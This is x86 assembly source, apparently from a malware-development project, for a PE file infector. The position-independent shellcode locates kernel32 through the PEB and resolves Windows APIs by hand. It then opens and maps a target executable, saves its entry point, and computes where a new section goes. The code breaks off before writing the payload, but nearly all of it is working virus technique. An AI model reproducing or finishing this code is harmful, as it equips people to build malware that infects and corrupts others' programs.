.386
.model flat
option casemap:none    

.code
_main proc
start_label:
	call start_code
start_code:
	pop ebx
	sub ebx, start_code

	push ebp
	mov ebp, esp
	sub esp, 300h			;prelog 
	xor eax, eax

	mov [ebp - 4], eax		;Base Kernel32.dll
	mov [ebp - 8], eax		;Base User32.dll

	mov [ebp - 12], eax		;VA MessageBoxA
	mov [ebp - 16], eax		;VA LoadLibraryA
	mov [ebp - 20], eax		;VA GetProcAddress 
	mov [ebp - 24], eax		;VA FindFirstFileA
	mov [ebp - 28], eax		;VA FindNextFileA
	mov [ebp - 32], eax		;VA CreateFileA
	mov [ebp - 36], eax		;VA GetFileSize
	mov [ebp - 40], eax		;VA CreateFileMappingA
	mov [ebp - 44], eax		;VA MapViewOfFile
	mov [ebp - 48], eax		;VA UnmapViewOfFile
	mov [ebp - 52], eax		;VA SetFilePointer
	mov [ebp - 56], eax		;VA ReadFile
	mov [ebp - 60], eax		;VA WriteFile
	mov [ebp - 64], eax		;VA CloseHandle

	mov [ebp - 68], eax		;File Handle
	mov [ebp - 72], eax		;File size
	mov [ebp - 76], eax		;File Mapping Handle
	mov [ebp - 80], eax		;File mapview address
	mov [ebp - 84], eax		;New number of sections
	mov [ebp - 88], eax		;SizeofOptionalHeader
	mov [ebp - 92], eax		;Old AOEP
	mov [ebp - 96], eax		;SectionAlignment
	mov [ebp - 100], eax	;FileAlignment
	mov [ebp - 104], eax	;New Sections Virtual Address
	mov [ebp - 108], eax	;New Sections Raw Address



	lea eax, [ebx + offset wszKernel32]
	push eax
	call GetModuleBase
	add esp, 4
	mov [ebp - 4], eax		;store kernel32 base

	lea eax, [ebx + offset sGetProcAddress]	
	push eax
	push [ebp - 4]
	call GetFuncAddr
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 20], eax		;VA GetProcAddress 	

	lea eax, [ebx + offset sLoadLibraryA]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 16], eax		;VA LoadLibraryA

	lea eax, [ebx + offset sUser32]
	push eax
	mov eax, [ebp - 16]		;VA LoadLibraryA
	call eax
	add eax, 4
	test eax, eax
	jz Exit
	and eax, 0ffff0000h		;Clear 2 low bytes
	mov [ebp - 8], eax		;Base User32.dll

	lea eax, [ebx + offset sMessageBoxA]
	push eax
	mov eax, [ebp - 8]
	push eax				;Base User32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 12], eax		;VA MessageBoxA

	lea eax, [ebx + offset sFindFirstFileA]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 24], eax		;VA FindFirstFileA

	lea eax, [ebx + offset sFindNextFileA]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 28], eax		;VA FindNextFileA

	lea eax, [ebx + offset sCreateFileA]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 32], eax		;VA CreateFileA

	lea eax, [ebx + offset sGetFileSize]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 36], eax		;VA GetFileSize

	lea eax, [ebx + offset sCreateFileMappingA]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 40], eax		;VA CreateFileMappingA

	lea eax, [ebx + offset sMapViewOfFile]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 44], eax		;VA MapViewOfFile

	lea eax, [ebx + offset sUnmapViewOfFile]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 48], eax		;VA UnmapViewOfFile

	lea eax, [ebx + offset sSetFilePointer]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 52], eax		;VA SetFilePointer

	lea eax, [ebx + offset sReadFile]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 56], eax		;VA ReadFile

	lea eax, [ebx + offset sWriteFile]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 60], eax		;VA WriteFile

	lea eax, [ebx + offset sCloseHandle]
	push eax
	push [ebp - 4]			;Base Kernel32.dll
	mov eax, [ebp - 20]		;VA GetProcAddress 	
	call eax
	add esp, 8
	test eax, eax
	jz Exit
	mov [ebp - 64], eax		;VA CloseHandle

;CreateFileA to infect
	push 0
	push 80h				;FILE_ATTRIBUTE_NORMAL		
	push 3					;OPEN_EXISTING
	push 0
	push 0
	push 0c0000000h			;GENERIC_WRITE | GENERIC_READ
	lea eax, [ebx + offset sFilePath]
	push eax
	mov eax, [ebp - 32]		;VA CreateFileA
	call eax
	cmp eax, -1
	je Exit
	mov [ebp - 68], eax		;File Handle

;GetFileSize
	push 0
	push eax				
	mov eax, [ebp - 36]		;GetFileSize
	call eax
	test eax, eax
	jz Exit
	mov [ebp - 72], eax

;CreateFileMappingA
	push 0
	push eax				;Filesize
	push 0
	push 4					;PAGE_READWRITE
	push 0
	push [ebp - 68]			;File handle
	mov eax, [ebp - 40]		;VA CreateFileMappingA
	call eax
	test eax, eax
	jz Exit
	mov [ebp - 76], eax		;File Mapping Handle

;MapViewOfFile
	push [ebp - 72]
	push 0
	push 0
	push 2					;FILE_MAP_WRITE (READ/WRITE)
	push [ebp - 76]			;File Mapping Handle
	mov eax, [ebp - 44]		;VA MapViewOfFile
	call eax
	test eax, eax
	jz Exit
	mov [ebp - 80], eax

;Parse PE
;Get number of sections
	mov esi, [ebp - 80]
	add esi, [esi + 03ch]	;pointer to nt header
	add esi, 6				;pointer number of sections
	mov ax, word ptr[esi]	;number of sections
	inc ax
	mov word ptr[ebp - 84], ax		;New number of sections

;Get size of optional header
	add esi, 0eh			;pointer to SizeOfOptionalHeader
	mov ax, word ptr[esi]	;SizeOfOptionalHeader
	mov word ptr[ebp - 88], ax	

;Get AOEP
	add esi, 4				;pointer to Optional header
	add esi, 10h			;pointer to AddressOfEntryPoint
	mov eax, [esi]			;AddressOfEntryPoint
	mov dwOldAOEP, eax
 
 ;Get Alignment
	add esi, 10h			;pointer to SectionAlignment
	mov eax, [esi]	
	mov [ebp - 96], eax

	add esi, 4
	mov eax, [esi]			;pointer to FileAlignment
	mov [ebp - 100], eax

;Get Pointer to Section Header
	mov esi, [ebp - 80]		;File Handle
	add esi, [esi + 3ch]	;NtHeader
	add esi, 18h			;OptionalHeader
	add esi, [ebp - 88]		;SectionHeader

;Get Pointer to Final Section
	mov ax, word ptr[ebp - 84]	;Number of sections
	sub ax, 2				;> 1 sections
	mov dx, 28h				;Size of 1 sections header
	mul dx	
	add esi, eax			;Pointer to final section header

	mov eax, [esi + 0ch]
	add eax, [esi + 8h]
	push [ebp - 96]
	push eax
	call CalcAlign
	mov [ebp - 104], eax	;calc New Sections Virtual Address

	mov eax, [esi + 014h]
	add eax, [esi + 010h]
	push [ebp - 100]
	push eax
	call CalcAlign
	mov [ebp - 108], eax	;calc New Sections Raw Address



Exit:
	mov esp, ebp
	pop ebp
	ret
_main endp

GetModuleBase proc      ; arg1: dll name; return base dll
	push ebp
	mov ebp, esp
	sub esp, 50h

	mov edi, [ebp + 8]

	assume fs:nothing
	mov eax, fs:[30h]		;Get PEB
	assume fs:error

	mov eax, [eax + 0ch]		;*LDR
	mov esi, [eax + 14h]		;LIST_ENTRY InMemoryOrderModuleList
	xor ecx, ecx
LoopGetModuleBase:
	mov esi, [esi]		;pointer to flink
	mov ecx, esi		
	sub ecx, 8h			;pointer to _LDR_DATA_TABLE_ENTRY 
	add ecx, 24h		;pointer to UNICODE_STRING FullDllName; 
	mov ecx, [ecx + 4h]	;pointer to PWSTR  Buffer;	

	push ecx
	push edi
	call CompareUnicodeString
	add esp, 8

	test eax, eax
	jz LoopGetModuleBase
	mov eax, [esi - 8h + 18h]	;Pointer to PVOID DllBase;
	mov esp, ebp
	pop ebp
	ret
GetModuleBase endp

GetFuncAddr proc	;arg1: base dll ;arg2: winapiname ;return address of api
	push ebp
	mov ebp, esp
	sub esp, 50h
	xor eax, eax

	mov [ebp - 4], eax		;base dll
	mov [ebp - 8], eax		;RVA to AddressOfFunctions
	mov [ebp - 12], eax		;RVA to AddressOfNameOridinal

	mov esi, [ebp + 8]		;base dll
	mov [ebp - 4], esi
	add esi, [esi + 3ch]	;pointer to nt header
	mov esi, [esi + 78h]
	mov eax, [ebp - 4]
	add esi, eax			;pointer to _IMAGE_EXPORT_DIRECTORY 
	lea eax, [esi + 20h]	;RVA to AddressOfNames array
	lea edx, [esi + 1ch]	;RVA to AddressOfFunctions
	mov [ebp - 8], edx
	lea edx, [esi + 24h]	;RVA to AddressOfNameOridinal
	mov [ebp - 12], edx	

	mov esi, [eax]			;RVA AddressOfNames[0]
	add esi, [ebp - 4]		;VA AddressOfNames[0]
	xor ecx, ecx

	mov edi, [ebp + 12]		;arg2 winapi name
LoopFindNameFunc:
	mov eax, [esi]
	add eax, [ebp - 4]
	
	push edi
	push eax
	call CompareString
	add esp, 8

	add esi, 4				;AddressOfNames[i + 1]
	inc ecx					;inc index
	test eax, eax			;Check result compare
	jz LoopFindNameFunc

	mov edx, [ebp - 12]		;RVA to AddressOfNameOridinal
	mov eax, [ebp - 4]		;base dll
	add eax, [edx]			;VA AddressOfNameOridinal

	lea edx, [ecx * 2]		;calc index of oridinals - word
	add eax, edx
	xor edx, edx
	mov dx, [eax]			;store oridinal to dx

	dec edx				;dec index
	lea edx, [edx * 4]	;calc offset (dword)
	mov eax, [ebp - 8]	;RVA address func
	mov eax, [eax]
	add eax, [ebp - 4]	;VA address func
	add eax, edx		;VA function find

	mov eax, [eax]		;RVA function find
	add eax, [ebp - 4]	;VA function

	mov esp, ebp
	pop ebp
	ret
GetFuncAddr endp

CompareUnicodeString proc	;arg1: unicode string 1		;arg2: unicode string 2
	push ebp
	mov ebp, esp
	sub esp, 50h

	push esi
	push edi

	mov esi, [ebp + 8]	;arg1
	mov edi, [ebp + 12] ;arg2

	xor ecx, ecx
LoopCompare:
	mov al, [esi + ecx]
	mov dl, [edi + ecx]
	add ecx, 2
	push eax
	call ToLower
	add esp, 4

	push eax		;store char1
	push edx
	call ToLower
	add esp, 4		;restore stack
	mov dl, al		;store result to dl
	pop eax			;restore char1

	test al, al
	jnz Compare
	test dl, dl
	jnz Compare
	mov eax, 1
	jmp ExitCompare

Compare:
	cmp al, dl
	je LoopCompare
	xor eax, eax
	jmp ExitCompare

ExitCompare:

	pop edi
	pop esi
	
	mov esp, ebp
	pop ebp
	ret
CompareUnicodeString endp

CompareString proc	;arg1: string 1 ;arg2: string 2
	push ebp
	mov ebp, esp
	
	push esi
	push edi

	mov esi, [ebp + 8]	;arg1
	mov edi, [ebp + 12]	;arg2
LoopCompareString:
	mov al, byte ptr [esi]
	mov dl, byte ptr [edi]
	inc esi
	inc edi

	push eax
	call ToLower
	add esp, 4

	push eax
	push edx
	call ToLower
	add esp, 4
	mov dl, al
	pop eax

	test al, al
	jnz CompareByte
	test dl, dl
	jnz CompareByte
	mov eax, 1
	jmp ExitCompareString
CompareByte:
	cmp al, dl
	je LoopCompareString
	xor eax, eax
ExitCompareString:
	
	pop edi
	pop esi

	mov esp, ebp
	pop ebp
	ret
CompareString endp

ToLower proc	;arg1: char compare
	push ebp
	mov ebp, esp
	mov al, byte ptr [ebp + 8]	;char
	cmp al, 65  ;'A'
	jb EndToLower
	cmp al, 90  ;'Z'
	ja EndToLower
	add al, 32  ;to lower
EndToLower:
	mov esp, ebp
	pop ebp
	ret
ToLower endp

CalcAlign proc	;arg1: value	;arg2: align
	push ebp
	mov ebp, esp

	mov edx, 0
	mov eax, [ebp + 8]
	mov ecx, [ebp + 12]
	div ecx

	cmp edx, 0
	je _not_add
	add eax, 1
_not_add:
	mov edx, [ebp + 12]
	mul edx

	mov esp, ebp
	pop ebp
	ret
CalcAlign endp

	sFilePath db "C:\Users\levuong\Documents\GitHub\MalDev\FileInfection\Debug\ShellCode.exe", 0
	wszKernel32 dw 'c',':','\','w','i','n','d','o','w','s','\','s','y','s','t','e','m','3','2','\','k','e','r','n','e','l','3','2','.', 'd','l','l', 0
	sUser32 db "User32.dll", 0
	sLoadLibraryA db "LoadLibraryA", 0
	sMessageBoxA db "MessageBoxA", 0
	sGetProcAddress db "GetProcAddress", 0
	sFindFirstFileA db "FindFirstFileA", 0
	sFindNextFileA db "FindNextFileA", 0
	sCreateFileA db "CreateFileA", 0
	sGetFileSize db "GetFileSize", 0
	sCreateFileMappingA db "CreateFileMappingA", 0
	sMapViewOfFile db "MapViewOfFile", 0
	sUnmapViewOfFile db "UnmapViewOfFile", 0
	sSetFilePointer db "SetFilePointer", 0
	sReadFile db "ReadFile", 0
	sWriteFile db "WriteFile", 0
	sCloseHandle db "CloseHandle", 0

	dwOldAOEP dd 0
end_label:
end _main